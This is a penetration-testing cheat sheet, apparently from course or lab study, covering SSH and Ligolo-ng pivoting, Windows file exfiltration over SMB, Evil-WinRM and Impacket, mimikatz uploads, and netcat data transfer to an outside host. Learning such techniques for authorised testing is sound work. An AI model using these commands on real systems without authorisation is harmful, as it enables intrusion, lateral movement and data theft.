# SSH

Start:
```bash
sudo systemctl start ssh
```

Remote Port Forwarding (not dynamic)
```
ssh -N -R 2345:<target-ip>:<port> kali@192.168.45.212
```
*Note: `2345` is the port that will open on Kali*
*Note: target IP could be localhost*

# Ligolo-ng

## Quickstart
### Automatic
```bash
# Kali Proxy
sudo ./proxy -laddr 0.0.0.0:9001 -selfcert

# Creating interface and starting it
interface_create --name "ligolo"

sudo ifconfig ligolo mtu 1250 # Mitigate infra issues

# Agent
agent.exe -connect <LHOST>:9001 -ignore-cert

# In Ligolo-ng console
session # Select agent
ifconfig # Notedown the internal network's subnet
interface_add_route --name "ligolo" --route 192.168.2.0/24
start # AFTER adding relevent subnet to ligolo interface
```
### Manual
```bash
# Creating interface and starting it
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ifconfig ligolo mtu 1250 # Mitigate infra issues

# Kali Proxy
sudo ./proxy -laddr 0.0.0.0:9001 -selfcert

# Agent
agent.exe -connect <LHOST>:9001 -ignore-cert

# In Ligolo-ng console
session # Select agent
ifconfig # Notedown the internal network's subnet

# Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo

# In Ligolo-ng console
start # AFTER adding relevent subnet to ligolo interface
```

## Local Port Redirect
1) Add special `240.0.0.1/32` which routes traffic to loopback address on the agent side of the tunnel:
```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```
2) ***ALTERNATIVELY***, use the `interface_add_route` built-in command:
```ligolo-ng
interface_add_route --name ligolo --route 240.0.0.1/32
```
3) Scans 3000/TCP on 127.0.0.1 on the agent-side of the tunnel.
```bash
sudo nmap -Pn -sT -p3000 240.0.0.1
```

## Local Port Redirect (Multiple Agents)
https://github.com/nicocha30/ligolo-ng/issues/15

> Switching to another session will not change the current "routing".
You need to start a relay on the other agent (and specify another interface using `start --tun ligolo2`), then change your system routing table to forward packets to 240.0.0.1 via ligolo2.

## Ligolo-ng Debugging / Cleanup

```bash
sudo ip link set ligolo down
sudo ip link delete ligolo
# Flush routes
sudo ip route del <internal-network> via 240.0.0.1
# Alternatively, flush all added routes:
sudo ip route flush table main
```

# Windows Exfil Back to Kali
### SMB
On Kali:
```bash
impacket-smbserver share . -smb2support -user kali -password kali
```
On Windows:
```PowerShell
net use \\<kali_ip>\share /user:kali kali
cp loot \\<kali_ip>\share\
net use \\<kali_ip>\share /delete # Optional: Delete share use
```
### Evil-WinRM
#### Downloading
```PowerShell
download mimikatz.log /home/kali/Documents/pen-200
```
#### Uploading
```PowerShell
upload mimikatz.exe  C:\Users\Public\mimikatz.exe
```

### Impacket
`psexec` and `wmiexec` are shipped with built in feature for file transfer.
*Note*: By default whether you upload (`lput`) or download (`lget`) a file, it'll be written in `C:\Windows` path.
#### Downloading
```PowerShell
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
#### Uploading
Uploading `mimikatz.exe` to the target machine:
```PowerShell
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
# Nmap via Ligolo-ng
```bash
sudo nmap 10.10.81.152 10.10.81.153 10.10.81.154 -Pn --unprivileged -sC -sV -p- -vv -oA nmap/tcp
```

# Nmap from Windows Victim

Download Nmap windows ZIP from tools
Unzip on target:
```
Expand-Archive -Path nmap.zip
```

```PowerShell
.\nmap.exe 192.168.207.141 192.168.207.142 -sC -sV -sS -p- -vv -oA initial
```

# Linux Exfiltration
On your receiver:
```bash
nc -l -p 1234 -q 1 > something.txt < /dev/null
```
On your sender:
```bash
cat something.txt | nc server.ip.here 1234
```
